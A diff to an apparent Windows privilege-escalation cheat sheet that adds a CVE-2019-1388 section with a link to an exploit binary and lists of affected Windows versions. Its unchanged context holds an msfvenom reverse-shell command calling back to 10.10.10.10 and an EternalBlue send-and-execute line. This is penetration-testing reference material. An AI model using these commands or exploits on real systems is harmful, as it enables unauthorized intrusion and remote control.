@@ -36,6 +36,7 @@
   * [MS15-051 (Client Copy Image)](#ms15-051---microsoft-windows-2003--2008--7--8--2012)
   * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
   * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
+  * [CVE-2019-1388](#cve-2019-1388)
 * [References](#references)
 
 ## Tools
@@ -883,6 +884,20 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=threa
 python2 send_and_execute.py 10.0.0.1 revshell.exe
 ```
 
+### CVE-2019-1388
+
+Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html
+
+Working on :
+- Windows 7 
+- Windows 10 LTSC 10240
+
+Failing on : 
+- LTSC 2019
+- 1709
+- 1803
+
+Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege
 
 ## References
 
